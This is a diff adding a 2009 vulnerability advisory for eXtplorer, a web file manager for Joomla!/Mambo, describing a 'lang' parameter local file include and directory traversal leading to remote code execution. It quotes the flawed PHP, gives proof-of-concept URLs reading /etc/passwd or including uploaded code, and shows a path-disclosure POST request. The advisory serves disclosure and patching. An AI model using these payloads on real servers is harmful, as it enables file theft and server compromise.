@@ -1,0 +1,164 @@
+=============================================
+INTERNET SECURITY AUDITORS ALERT 2009-002
+- Original release date: January 7th, 2009
+- Last revised:  March 2nd, 2009
+- Discovered by: Juan Galiana Lara
+- Severity: 9/10 (CVSS scored)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+eXtplorer standalone & Joomla!/Mambo Remote Code Execution vulnerability
+
+II. BACKGROUND
+-------------------------
+eXtplorer is a web-based File Management Component for all your needs.
+It has a desktop-application-like interface with drag&drop, grid and a
+directory tree and makes heavy use of the ExtJS Javascript Library.
+It's widely used to access and modify the files and directories on
+your server via FTP or direct file access.
+It runs natively under Joomla! 1.5.x, 1.0.x, Mambo component and can
+also be used as a standalone app. Is based on Quixplorer (available at
+http://sourceforge.net/projects/quixplorer/). eXtplorer is released
+under a dual-license: the Mozilla Public License (MPL 1.1) and the GNU
+General Public License (GNU/GPL).
+
+III. DESCRIPTION
+-------------------------
+eXtplorer is prone to a local file include and directory traversal
+vulnerability because the application fails to sufficiently sanitize
+user-supplied input. The parameter 'lang' is not properly sanitized.
+Since the application allows to upload files to the server could be
+combined with previous vulnerabilities to allow an attacker to view
+any local file or execute arbitrary code remotely in the context of
+the webserver. This may aid in launching further attacks.
+
+In order to perform the attack, an attacker could upload a PHP
+maliciuos code (upload action is allowed by the application), then
+exploit a bug to know the full path to the local file recently
+uploaded (if 'display_errors' directive is set to On) and then include
+it exploiting the local file include and directory traversal flaw
+(using ../../path/to/file) to finally execute the php code.
+Successfully explotation of this flaw may aid in the compromise of the
+server in the context of the webserver.
+
+The software is affected running standalone or as a Joomla!/Mambo
+component.
+
+IV. PROOF OF CONCEPT
+-------------------------
+The affected code:
+
+File: include/init.php Line 100
+
+$GLOBALS["language"] = $mainframe->getUserStateFromRequest(
+'language', 'lang', $default_lang );
+
+File: include/init.php Line: 145
+
+// Necessary files
+
+require_once( _EXT_PATH."/config/conf.php" );
+if( file_exists(_EXT_PATH."/languages/".$GLOBALS["language"].".php")) {
+        require_once(
+_EXT_PATH."/languages/".$GLOBALS["language"].".php" ); <- HERE
+}
+else {
+        require_once( _EXT_PATH."/languages/english.php" );
+}
+if(
+file_exists(_EXT_PATH."/languages/".$GLOBALS["language"]."_mimes.php")) {
+        require_once(
+_EXT_PATH."/languages/".$GLOBALS["language"]."_mimes.php" ); <- HERE
+}
+else {
+        require_once( _EXT_PATH."/languages/english_mimes.php" );
+}
+
+the file include/init.php is included in all the request to the
+application.
+
+Here is a poc:
+
+PoC: http://site/path/?lang=../../path/to/maliciuos_uploaded_code
+PoC: http://site/path/?lang=../../../../../etc/passwd%00
+
+The bug can be exploited with or without 'magic_quotes_gpc', but note
+that if magic_quotes_gpc is set to Off, an attacker can view any file,
+adding a '\0' character like /etc/passwd, if not only can include php
+files, allowing to execute any php code he want.
+Is also possible to hide the crafted parameters data including it
+thougth POST method, making detection more difficult to site
+administrator.
+
+In order to successfully perform this attack the attacker must have
+the full path where the files are uploaded, and it is easy to get
+making a request like this:
+
+POST /path/index.php HTTP/1.1
+Host: host
+User-Agent: user-agent
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://host/path
+Content-Length: 80
+Cookie: PHPSESSID=<my_phpsessid>; eXtplorer=<my_cookie>
+Pragma: no-cache
+Cache-Control: no-cache
+start=0&limit=50&dir=x&option=com_extplorer&action=getdircontents&sendWhat=files
+
+The response is a JSON file:
+
+{"action":"","message":"\/var\/www\/path\/\/x : This directory
+doesn\\'t exist.","error":"\/var\/www\/path\/\/x : This directory
+doesn\\'t exist.","success":false}
+
+Sending "x", the application came back "/var/www/path/x".
+
+V. BUSINESS IMPACT
+-------------------------
+An attacker could execute arbitrary code remotely and maybe gain
+access to the operating system of the server.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+Versions prior to 2.0.0 of eXtplorer are vulnerable.
+
+VII. SOLUTION
+-------------------------
+Upgrade to version 2.0.1 of eXtplorer. It can be downloaded from
+http://extplorer.sourceforge.net
+
+VIII. REFERENCES
+-------------------------
+http://extplorer.sf.net
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Juan Galiana Lara (jgaliana (at) isecauditors (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+March    02, 2009: Initial release
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+January  07, 2009: eXtplorer contacted
+January  15, 2009: eXtplorer release version 2.0.1
+March    02, 2009: Vulnerability published
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is"
+with no warranties or guarantees of fitness of use or otherwise.
+Internet Security Auditors, S.L. accepts no responsibility for any
+damage caused by the use or misuse of this information.
+
+# milw0rm.com [2009-03-02]
